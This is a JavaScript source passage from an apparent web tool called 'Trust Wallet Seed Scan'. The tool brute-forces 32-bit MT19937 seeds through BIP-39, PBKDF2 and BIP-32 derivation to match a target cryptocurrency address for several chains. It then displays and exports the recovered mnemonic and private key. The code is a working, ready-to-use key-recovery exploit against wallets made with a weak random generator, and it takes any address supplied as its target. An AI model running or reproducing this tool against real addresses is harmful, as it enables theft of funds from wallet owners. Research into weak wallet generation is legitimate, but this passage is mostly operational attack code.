                priv = hx((BigInt("0x" + Il.slice(0, 64)) + BigInt("0x" + priv)) % N);
                chain = Il.slice(64);
            }
            return priv;
        }
        function compareValue(privHex, kind) {
            var Q = sMul(BigInt("0x" + privHex));
            var xh = hx(Q.x), yh = hx(Q.y);
            var cpub = (Q.y & 1n ? "03" : "02") + xh;
            var upub = "04" + xh + yh;
            if (kind === 'evm') return "0x" + keccakHex(bytesOfHex(upub.slice(2))).slice(-40);
            if (kind === 'tron') return keccakHex(bytesOfHex(upub.slice(2))).slice(-40);
            if (kind === 'xrp') return h160(cpub);
            return h160(cpub);
        }

        onmessage = function (e) {
            var lo = e.data.lo, hi = e.data.hi, coin = e.data.coin;
            var target = (e.data.target || "").toLowerCase();
            var kind = e.data.kind || 'p2pkh';
            var words = e.data.words || [];
            var checked = 0, total = (hi - lo + 1);
            var seed = lo;
            function next() {
                if (seed > hi) { postMessage({ type: "done", checked: checked }); return; }
                var s = seed; seed++;
                var entropy, mnem;
                try { entropy = mtEntropy(s); mnem = mnemonicFromEntropy(entropy, words); }
                catch (err) { checked++; next(); return; }
                pbkdf2(mnem).then(function (seedHex) {
                    var privHex;
                    try { privHex = pathPriv(seedHex, coin); }
                    catch (err) { checked++; next(); return; }
                    var cv;
                    try { cv = compareValue(privHex, kind); }
                    catch (err) { checked++; next(); return; }
                    if (cv === target) {
                        postMessage({ type: "found", seed: s, priv: privHex, mnemonic: mnem, entropy: entropy, seedHex: seedHex });
                        return;
                    }
                    checked++;
                    if ((s & 63) === 0) postMessage({ type: "progress", checked: checked, total: total, seed: s });
                    next();
                });
            }
            next();
        };
    }

    var WORKER_SRC = '(' + twWorkerBody.toString() + ')()';
    var _workerURL = null;
    function buildWorker() {
        try {
            if (typeof Worker === 'undefined' || typeof URL === 'undefined' || !URL.createObjectURL) return null;
            if (!_workerURL) _workerURL = URL.createObjectURL(new Blob([WORKER_SRC], { type: 'application/javascript' }));
            return new Worker(_workerURL);
        } catch (e) { return null; }
    }

    // Chunked main-thread fallback (worker unavailable / CDN import blocked).
    function mainThreadScan(chain, target, lo, hi, words, onProgress) {
        const info = chainInfo(chain);
        return new Promise(function (resolve) {
            let seed = lo, checked = 0; const total = (hi - lo + 1);
            function chunk() {
                const end = Math.min(hi, seed + 23);   // small chunks: PBKDF2 is heavy
                for (; seed <= end; seed++) {
                    try {
                        const entropy = mtEntropyHex(seed);
                        const mnemonic = entropyToMnemonic(entropy, words);
                        const seedHex = pbkdf2Sha512Hex(mnemonic, "mnemonic");
                        const privHex = derivePathPriv(seedHex, info.coin);
                        const pk = pubsFromPriv(BigInt('0x' + privHex));
                        if (chainCompareValue(pk, chain) === target) {
                            resolve({ found: true, seed: seed, priv: privHex, mnemonic: mnemonic, entropy: entropy, seedHex: seedHex });
                            return;
                        }
                    } catch (e) { /* skip invalid */ }
                    checked++;
                }
                if (onProgress) onProgress({ checked: checked, total: total, seed: end });
                if (seed <= hi) setTimeout(chunk, 0); else resolve({ found: false, checked: checked });
            }
            chunk();
        });
    }

    function runScan(chain, target, kind, coin, lo, hi, words, onProgress) {
        return new Promise(function (resolve) {
            const w = buildWorker();
            if (!w) { mainThreadScan(chain, target, lo, hi, words, onProgress).then(resolve); return; }
            let fellBack = false;
            const fallback = function () { if (fellBack) return; fellBack = true; try { w.terminate(); } catch (e) { } mainThreadScan(chain, target, lo, hi, words, onProgress).then(resolve); };
            w.onmessage = function (ev) {
                const m = ev.data;
                if (m.type === 'noimport') { fallback(); }
                else if (m.type === 'progress') { if (onProgress) onProgress(m); }
                else if (m.type === 'found') { try { w.terminate(); } catch (e) { } resolve({ found: true, seed: m.seed, priv: m.priv, mnemonic: m.mnemonic, entropy: m.entropy, seedHex: m.seedHex }); }
                else if (m.type === 'done') { try { w.terminate(); } catch (e) { } resolve({ found: false, checked: m.checked }); }
            };
            w.onerror = function () { fallback(); };
            w.postMessage({ target: target, kind: kind, coin: coin, lo: lo, hi: hi, words: words });
        });
    }

    // ---- Output header + export ------------------------------------------
    function getOutputHeader(elementId) {
        let header = `<div class="result-header">CRYPTOGRAPHYTUBE<span class="tool-tag">Trust Wallet Seed Scan</span></div>`;
        if (elementId) {
            header += `
            <div class="download-tools">
                <button class="btn-small btn-txt" title="Export as TXT" onclick="exportOne('${elementId}', 'txt')">
                    <img src="../assets/svgs/solid/download.svg" width="12" height="12" alt=""> SAVE TXT
                </button>
            </div>`;
        }
        return header;
    }
    function exportOne(id, type) {
        const el = document.getElementById(id);
        if (!el || el.innerText.trim() === "" || el.innerText.includes("Instructions:") || el.innerText.length < 5) {
            alert("No results to export for this section yet.");
            return;
        }
        const section = el.closest('.tool-section');
        const title = section ? (section.querySelector('h3') ? section.querySelector('h3').innerText : "CryptographyTube Result") : "CryptographyTube Result";
        let headerText = `CRYPTOGRAPHYTUBE REPORT\n`;
        headerText += `TOOL: ${title.toUpperCase()}\n`;
        headerText += `GENERATED: ${new Date().toLocaleString()}\n`;
        headerText += `--------------------------------------------------\n\n`;
        const fullContent = headerText + (el.innerText || el.textContent);
        if (type === 'txt') {
            const blob = new Blob([fullContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; a.download = `CryptographyTube_Report_${id}.txt`;
            document.body.appendChild(a); a.click(); document.body.removeChild(a);
        }
    }

    // ---- HTML helpers ----------------------------------------------------
    function escapeHtml(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }
    function copyBtn(text) {
        if (text == null || text === '') return '';
        return '<button type="button" class="rsz-copy" title="Copy" data-copy="' +
            escapeHtml(text) + '"><img src="../assets/svgs/regular/copy.svg" width="12" height="12" alt="copy"></button>';
    }
    function rszLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' +
            '<code class="rsz-val">' + escapeHtml(val || '—') + '</code>' + copyBtn(val) + '</div>';
    }
    function addrLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' +
            '<code class="rsz-val rsz-addr-val">' + escapeHtml(val || '—') + '</code>' + copyBtn(val) + '</div>';
    }
    function fallbackCopy(text, done) {
        try {
            const ta = document.createElement('textarea');
            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
            document.body.appendChild(ta); ta.select();
            document.execCommand('copy'); document.body.removeChild(ta); done();
        } catch (e) { /* ignore */ }
    }
    document.addEventListener('click', function (ev) {
        const btn = ev.target && ev.target.closest ? ev.target.closest('.rsz-copy[data-copy]') : null;
        if (!btn) return;
        const val = btn.getAttribute('data-copy');
        const done = function () { btn.classList.add('copied'); setTimeout(function () { btn.classList.remove('copied'); }, 1200); };
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(val).then(done).catch(function () { fallbackCopy(val, done); });
        } else { fallbackCopy(val, done); }
    });
    function spinner(size) {
        const n = size || 13;
        return '<img src="../assets/svgs/solid/spinner.svg" class="txr-spin" width="' + n + '" height="' + n + '" alt="loading">';
    }

    // ---- Renderers -------------------------------------------------------
    function keyBlock(seed, der, chain, matched) {
        const info = chainInfo(chain);
        const pk = pubsFromPriv(BigInt('0x' + der.priv));
        let h = '';
        h += '<div class="rsz-vuln-box">';
        h += '<div class="rsz-vuln-title"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="15" height="15" alt=""> ' +
            'WEAK WALLET — MT19937 seed ' + seed + ' · ' + escapeHtml(info.name) +
            (matched ? ' · matched target address' : '') + '</div>';
        h += '<div class="rsz-leak-bits">BIP-39 entropy: ' + escapeHtml(der.entropy) + '</div>';
        h += '<div class="rsz-vuln-key"><span class="key-label">12-word mnemonic</span>' +
            '<span class="private-key">' + escapeHtml(der.mnemonic) + '</span>' + copyBtn(der.mnemonic) + '</div>';
        h += rszLine('BIP-39 seed (PBKDF2·2048)', der.seedHex);
        h += '<div class="rsz-vuln-key"><span class="key-label">' + escapeHtml(info.name) + ' key (m/44\'' + info.coin + '\'/0\'/0/0)</span>' +
            '<span class="private-key">' + escapeHtml(der.priv) + '</span>' + copyBtn(der.priv) + '</div>';
        if (info.kind === 'p2pkh' || info.kind === 'zcash') {
            h += addrLine('Address (compressed)', addrFromPub(pk.cpub, info.version));
            h += addrLine('Address (uncompressed)', addrFromPub(pk.upub, info.version));
        } else {
            const addrs = chainAddresses(pk, chain);
            if (addrs.length) h += addrLine(info.name + ' address', addrs[0]);
        }
        if (matched) {
            h += '<div class="rsz-leak-bits">Recovered by scanning the seed range — the address regenerates from this key, so the match is verified, not guessed.</div>';
        }
        h += '</div>';
        return h;
    }

    function renderScanResult(res, lo, hi, targetAddr, chain) {
        const info = chainInfo(chain);
        let html = '';
        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + escapeHtml(info.name) + '</span>';
        html += '<span class="rsz-chip">seed range ' + lo + '–' + hi + '</span>';
        html += '<span class="rsz-chip">' + (res.checked != null ? res.checked.toLocaleString() : (hi - lo + 1).toLocaleString()) + ' seeds tested</span>';
        if (res.found) html += '<span class="rsz-chip rsz-chip-danger">Weak wallet recovered</span>';
        else html += '<span class="rsz-chip rsz-chip-ok">No weak wallet in range</span>';
        html += '</div>';
        html += '<div class="rsz-line"><span class="rsz-tag">TARGET</span>' +
            '<code class="rsz-val rsz-addr-val">' + escapeHtml(targetAddr) + '</code>' + copyBtn(targetAddr) + '</div>';
        if (res.found) {
            html += keyBlock(res.seed, { priv: res.priv, mnemonic: res.mnemonic, entropy: res.entropy, seedHex: res.seedHex }, chain, true);
        } else {
            html += '<div class="rsz-leak-note rsz-leak-ok">Scanned ' + (hi - lo + 1).toLocaleString() +
                ' seeds for a ' + escapeHtml(info.name) + ' address — no seed in this range produced it. ' +
                'Each seed needs a full BIP-39 + PBKDF2 + BIP-32 derivation, so ranges are intentionally bounded; ' +
                'the full 2^32 seed space is a GPU job. Widen the range in slices (e.g. +10000) or try a different slice.</div>';
        }
        return html;
    }

    function renderVerify(seed, chain, words) {
        const info = chainInfo(chain);
        let html = '';
        const entropy = mtEntropyHex(seed);
        const mnemonic = entropyToMnemonic(entropy, words);
        const seedHex = pbkdf2Sha512Hex(mnemonic, "mnemonic");
        const priv = derivePathPriv(seedHex, info.coin);
        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">MT19937 seed ' + seed + '</span>';
        html += '<span class="rsz-chip rsz-chip-danger">wallet derived</span>';
        html += '</div>';
        html += '<div class="rsz-leak-note">A 32-bit RNG seed collapses the whole wallet: MT19937 outputs form the BIP-39 entropy, ' +
            'so the mnemonic, master key and every address are determined by this one number. ' +
            'Paste the ' + escapeHtml(info.name) + ' address into <strong>Scan</strong> to watch the range brute recover it.</div>';
        html += keyBlock(seed, { priv: priv, mnemonic: mnemonic, entropy: entropy, seedHex: seedHex }, chain, null);
        return html;
    }

    // ---- Entry points ----------------------------------------------------
    function activeChain() { return window.TXR_CHAIN || 'bitcoin'; }
    function readRange() {
        const loEl = document.getElementById('range_lo');
        const hiEl = document.getElementById('range_hi');
        let lo = loEl ? parseInt(loEl.value, 10) : 0;
        let hi = hiEl ? parseInt(hiEl.value, 10) : 4095;
        if (!Number.isFinite(lo) || lo < 0) lo = 0;
        if (!Number.isFinite(hi) || hi < 0) hi = 4095;
        if (hi < lo) { const t = lo; lo = hi; hi = t; }
        if (hi - lo > MAX_RANGE) hi = lo + MAX_RANGE;
        return { lo: lo, hi: hi };
    }

    async function processTxid() {
        const input = (document.getElementById("target_input") || {}).value;
        const out = document.getElementById("out_txid");
        if (!out) return;
        const header = getOutputHeader(out.id);
        const chain = activeChain();
        const info = chainInfo(chain);
        const addr = (input || "").trim();
        if (!addr) { out.innerHTML = header + '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Enter a ' + escapeHtml(info.name) + ' address to recover.</div>'; return; }

        let target;
        try { target = parseTarget(chain, addr); }
        catch (e) { out.innerHTML = header + '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' + escapeHtml(e.message) + '</div>'; return; }

        const words = await loadWordlist();
        if (!words) {
            out.innerHTML = header + '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Could not load the BIP-39 wordlist (assets/data/bip39-english.txt). Check your connection and retry.</div>';
            return;
        }

        const { lo, hi } = readRange();
        const t0 = Date.now();
        const setStatus = function (msg) { out.innerHTML = header + '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>'; };
        setStatus('Scanning seeds ' + lo + '–' + hi + ' (full BIP-39 + BIP-32 per seed) for a ' + info.name + ' address (' + addr + ')…');

        const res = await runScan(chain, target.target, target.kind, info.coin, lo, hi, words, function (p) {
            const pct = p.total ? Math.floor((p.checked / p.total) * 100) : 0;
            setStatus('Scanning… seed ' + (p.seed != null ? p.seed : '?') + ' / ' + hi + '  (' + pct + '%, ' + p.checked.toLocaleString() + ' seeds)');
        });
        res._ms = Date.now() - t0;
        out.innerHTML = header + renderScanResult(res, lo, hi, target.addr, chain) +
            '<div class="rsz-leak-note" style="margin-top:.6rem">Scan finished in ' + (res._ms / 1000).toFixed(1) + ' s (PBKDF2 makes each seed ~10–30 ms; widen the range in slices).</div>';
    }

    async function verifyPid() {
        const out = document.getElementById("out_txid");
        if (!out) return;
        const header = getOutputHeader(out.id);
        const chain = activeChain();
        const raw = (document.getElementById('seed_input') || {}).value;
        const seed = parseInt((raw || "").trim(), 10);
        if (!Number.isFinite(seed) || seed < 0 || seed > 0xFFFFFFFF) {
            out.innerHTML = header + '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Enter a 32-bit seed (0 to 4294967295, e.g. 1337).</div>';
            return;
        }
        const words = await loadWordlist();
        if (!words) {
            out.innerHTML = header + '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Could not load the BIP-39 wordlist (assets/data/bip39-english.txt).</div>';
            return;
        }
        out.innerHTML = header + renderVerify(seed >>> 0, chain, words);
    }

    // ---- Expose ----------------------------------------------------------
    window.processTxid = processTxid;   // Scan
    window.verifyPid = verifyPid;       // Verify a seed
    window.exportOne = exportOne;
})();
